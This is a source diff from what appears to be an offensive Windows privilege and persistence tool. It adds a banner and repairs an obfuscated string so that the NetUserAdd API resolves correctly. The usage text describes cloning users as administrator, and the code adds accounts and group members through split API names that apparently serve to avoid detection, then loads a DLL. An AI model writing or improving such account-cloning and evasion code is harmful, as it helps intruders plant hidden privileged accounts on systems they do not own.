@@ -6,7 +6,7 @@
 #include "RegTool.h"
 #include "AclTool.h"
 #include "ElevateTool.h"
-
+#include <iostream>
 //因为太菜，所以用个全局变量
 bool powermode = false;
 
@@ -25,6 +25,14 @@ bool is64BitOS()
 
 void printUsage(wchar_t *filename) {
 
+	
+	std::cout << R"(
+    __             ____    ___     ____  
+   /  \   __ __   |__  |  |_  )   |__  | 
+  | () |  \ \ /     / /    / /      / /  
+   \__/   /_\_\    /_/    /___|    /_/		author:hl0rey
+
+		)" << std::endl;
 	wprintf(L"\n");
 	wprintf(L"1. Clone zhangsan as administrator: %ws zhangsan\n",filename);
 	wprintf(L"2. Clone zhangsan as lisi: %ws zhangsan lisi\n", filename);
@@ -210,9 +218,9 @@ int adduserloaddll(wchar_t* username, wchar_t* password,wchar_t* dllpath) {
 		return -4;
 	}
 	char addapi[11] = "NetUs";
-	char addapi2[11] = "serAdd";
+	char addapi2[11] = "erAdd";
 	strcat(addapi, addapi2);
-	pNetUserAdd pna = (pNetUserAdd)GetProcAddress(hNetapi32, addapi);;
+	pNetUserAdd pna = (pNetUserAdd)GetProcAddress(hNetapi32, addapi);
 
 	char addgroup[24]="NetLocalGr";
 	char addgroup2[24]= "oupAddMembers";
